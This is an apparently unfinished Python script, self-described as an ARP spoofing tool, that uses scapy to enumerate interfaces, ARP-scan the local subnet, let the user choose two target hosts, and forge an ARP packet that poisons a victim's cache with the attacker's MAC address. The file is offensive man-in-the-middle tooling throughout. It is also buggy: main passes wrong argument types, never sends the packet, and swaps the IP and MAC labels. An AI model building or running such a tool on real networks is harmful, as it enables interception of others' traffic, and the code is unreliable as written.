import scapy.layers.l2
from scapy.all import *
import netifaces
from math import log
from uuid import getnode as get_mac


class Interface:
    def __init__(self, name, netmask, addr, hwaddr):
        self.name = name
        self.netmask = netmask
        self.addr = addr
        self.hwaddr = hwaddr

    def get_name(self):
        return self.name

    def get_netmask(self):
        return self.netmask

    def get_addr(self):
        return self.addr

    def get_hwaddr(self):
        return self.hwaddr


class Host:
    def __init__(self, addr, hwaddr):
        self.addr = addr
        self.hwaddr = hwaddr

    def get_addr(self):
        return self.addr

    def get_hwaddr(self):
        return self.hwaddr


class NetworkRecon:
    @staticmethod
    def list_interfaces():
        # ID for the IP address information on this system
        inet_id = netifaces.AF_INET
        link_id = netifaces.AF_LINK

        interfaces = []
        for interface_name in sorted(netifaces.interfaces()):
            int_ip_data = netifaces.ifaddresses(interface_name)
            hw_data = netifaces.ifaddresses(interface_name)

            try:
                inet_values = int_ip_data[inet_id][0]
                hw_values = hw_data[link_id][0]
            except TypeError:
                continue
            except KeyError:
                continue

            netmask = inet_values.get("netmask")
            addr = inet_values.get("addr")
            hwaddr = hw_values.get("addr")

            iface = Interface(interface_name, netmask, addr, hwaddr)

            interfaces.append(iface)

        return interfaces

    @staticmethod
    def list_hosts(interface: Interface):
        netmask = interface.get_netmask().split(".")
        ip = interface.get_addr().split(".")

        ip = [int(x) for x in ip]

        # TODO: This is bad, make not bad
        if ip[3] != 0:
            ip[3] = ip[3] - 1

        elif ip[2] != 0:
            ip[3] = 255
            ip[2] = ip[2] - 1

        elif ip[1] != 0:
            ip[3] = 255
            ip[2] = 255
            ip[1] = ip[1] - 1

        elif ip[0] != 0:
            ip[3] = 255
            ip[2] = 255
            ip[1] = 255
            ip[0] = ip[0] - 1

        ip_str = ""

        for segment in ip:
            ip_str = ip_str + str(segment) + "."

        ip_str = ip_str[:-1]

        cidr = 0
        for portion in netmask:
            cidr = cidr + log(int(portion) + 1, 2)

        cidr = str(int(cidr))

        cidr_full = ip_str + "/" + cidr

        conf.iface = interface.get_name()
        tmp = scapy.layers.l2.arping(cidr_full)

        print()

        host_list = []

        for item in tmp[0]:
            tmpHost = Host(item[0].pdst, item[1].src)
            host_list.append(tmpHost)

        return host_list


class CommandLineInterface:
    @staticmethod
    def interface_selector():
        # TODO: Add error detection
        interfaces = NetworkRecon.list_interfaces()
        print("Available interfaces:")
        i = 0
        for interface in interfaces:
            print(str(i) + ": " + interface.name)
            i = i + 1

        print("")

        selected_interface_id = input("Please choose a network interface: ")

        print("")

        try:
            selected_interface_id = int(selected_interface_id)
            selected_interface = interfaces[selected_interface_id]

        except ValueError:
            i = 0
            for interface in interfaces:
                if interface.name == selected_interface_id:
                    selected_interface = interfaces[i]
                    break
                i = i + 1

        return selected_interface

    @staticmethod
    def host_selector(interface: Interface):
        # TODO: Add error detection
        hosts = NetworkRecon.list_hosts(interface)
        print("Available hosts:")
        i = 0
        for host in hosts:
            print("host " + str(i) + " ip: " + host.get_hwaddr() + ", mac: " + host.get_addr())
            i = i + 1

        print()

        target_1_id = input("Please select target #1: ")
        target_2_id = input("Please select target #2: ")

        target_1 = hosts[int(target_1_id)]
        target_2 = hosts[int(target_2_id)]

        selected_hosts = [target_1, target_2]

        return selected_hosts


def build_packet(mac_attacker: str, ip_to_spoof: str, mac_victim: str, ip_victim: str):
    ether_index = 0
    arp_index = 1

    arp = scapy.layers.l2.Ether() / scapy.layers.l2.ARP()
    arp[ether_index].src = mac_attacker
    arp[arp_index].hwsrc = mac_attacker
    arp[arp_index].psrc = ip_to_spoof
    arp[arp_index].hwdst = mac_victim
    arp[arp_index].pdst = ip_victim

    return arp


def main():
    print("This is an ARP Spoofing tool.\n")
    selected_interface = CommandLineInterface.interface_selector()
    targets = CommandLineInterface.host_selector(selected_interface)
    build_packet(selected_interface.get_hwaddr(), targets[0], "", targets[1])
    print(targets[0].get_hwaddr())


main()
